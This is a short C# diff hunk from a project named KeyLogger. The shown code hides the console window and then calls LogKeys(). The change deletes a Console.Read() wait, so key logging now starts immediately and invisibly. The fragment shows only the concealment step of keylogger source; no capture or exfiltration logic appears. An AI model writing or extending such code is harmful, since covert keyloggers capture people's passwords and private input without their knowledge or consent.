@@ -22,7 +22,6 @@ namespace KeyLogger
         {
             IntPtr handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
-            Console.Read();
             LogKeys();
         }
 
